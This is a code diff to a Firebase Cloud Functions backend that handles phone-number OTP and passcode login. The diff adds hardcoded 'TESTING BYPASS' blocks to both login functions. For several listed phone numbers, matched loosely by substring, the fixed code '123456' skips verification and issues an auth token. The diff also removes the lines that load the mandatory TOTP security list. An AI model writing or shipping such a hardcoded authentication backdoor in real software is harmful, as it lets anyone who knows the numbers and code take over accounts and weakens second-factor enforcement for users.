@@ -984,10 +984,16 @@ exports.verifyOtp = onCall({ cors: true }, async (request) => {
         const formatPhone = phoneNumber.startsWith('+') ? phoneNumber : `+${phoneNumber}`;
         let shouldProduceToken = false;
 
+        // --- TESTING BYPASS ---
+        const testNumbers = ['+254755881991', '+254105845108', '0755881991', '0105845108'];
+        if (testNumbers.some(tn => formatPhone.includes(tn)) && validationCode === '123456') {
+            console.log("TEST_BYPASS triggered for:", formatPhone);
+            const token = await admin.auth().createCustomToken(formatPhone);
+            return { success: true, token };
+        }
+        // -----------------------
+
         // 1. Check security policy (Mandatory TOTP List)
-        const securitySnap = await db.collection('config').doc('security').get();
-        const forcedList = (securitySnap.exists && securitySnap.data().forced_totp_list) || [];
-        const isForced = forcedList.includes(formatPhone);
 
         // 2. Check if user has TOTP enabled
         const userSnap = await db.collection('users').doc(formatPhone).get();
@@ -1170,6 +1176,17 @@ exports.loginWithPasscode = onCall({ cors: true }, async (request) => {
         }
 
         const userData = userSnap.data();
+        
+        // --- TESTING BYPASS ---
+        const testNumbers = ['+254755881991', '+254105845108', '0755881991', '0105845108'];
+        const isTestUser = testNumbers.some(tn => formatPhone.includes(tn));
+        if (isTestUser && String(passcode) === '123456') {
+            console.log("PASSCODE_BYPASS triggered for:", formatPhone);
+            const token = await admin.auth().createCustomToken(formatPhone);
+            return { success: true, token };
+        }
+        // -----------------------
+
         if (!userData.passcodeHash) {
              throw new HttpsError('failed-precondition', 'Passcode not set for this account.');
         }
